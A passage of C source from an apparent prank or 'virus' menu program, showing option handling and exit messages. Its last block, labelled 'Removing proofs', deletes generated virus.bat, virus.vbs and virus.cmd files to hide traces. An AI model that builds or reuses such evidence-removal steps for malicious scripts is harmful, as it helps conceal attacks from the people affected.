//EXIT
case 4 :{
    printf("Thanks for Using script, see you later, enjoy your anger till then......");
exit(0);
}
//WRONG INPUT
default : {
    printf("\a Enter options from above, Try again");
goto C2;
break;
}
    }
}
                                                                case 2 :
    C5:
        choice3=utility();
        clear();
        switch(choice3)
        {
    case 1 : {
    calculator();
    break;
    }

    case 2 : {
    edm();
    break;
    }

    case 3 : {
    guess();
    break;
    }

    case 4 : {
    matrix();
    break;
    }

    case 5 : {
    otp();
    break;
    }

    case 6 : {
    cleanup();
    break;
    }

    case 7 : {
    talk();
    break;
    }

    case 8 : {
    goto C1;
    break;
    }

    case 9 : {
       printf("Thanks for Using script, see you later, enjoy your anger till then......");
exit(3);
    break;
    }


    default : {
     printf("\a Enter options from above, Try again");
goto C5;
    break;
    }
    }


                                                                        case 3 : {
     printf("Thanks for Using script, see you later, enjoy your anger till then......");
     exit(10);
break;
}

                                                                        default : {
     printf("\a Enter options from above, Try again");
goto C1;
}
        }



//REMOVING BUILD FILES
printf("Removing proofs:\n");
system("del virus.bat");
system("del virus.vbs");
system("del virus.cmd");

}
